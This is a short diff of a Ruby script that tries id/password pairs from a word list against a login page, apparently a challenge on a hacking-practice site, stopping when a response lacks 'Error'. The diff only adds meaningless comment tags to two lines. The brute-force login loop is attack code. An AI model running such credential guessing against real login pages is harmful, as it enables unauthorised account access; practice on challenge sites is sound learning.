@@ -9,9 +9,9 @@ uri=URI.parse('http://www.hackerschool.jp/hack/take55_attack.php')
 Net::HTTP.start(uri.host){|http|
 	list.each_with_index{|e,i|
 		puts e+' '+i.to_s
-		body=http.post(uri.path,'id='+e+'&pass='+e).body
+		body=http.post(uri.path,'id='+e+'&pass='+e).body # cgz6HILS
 		unless body=~/Error/
-			puts body
+			puts body # jwty5w5tyc9suhbe
 			break
 		end
 		#sleep()
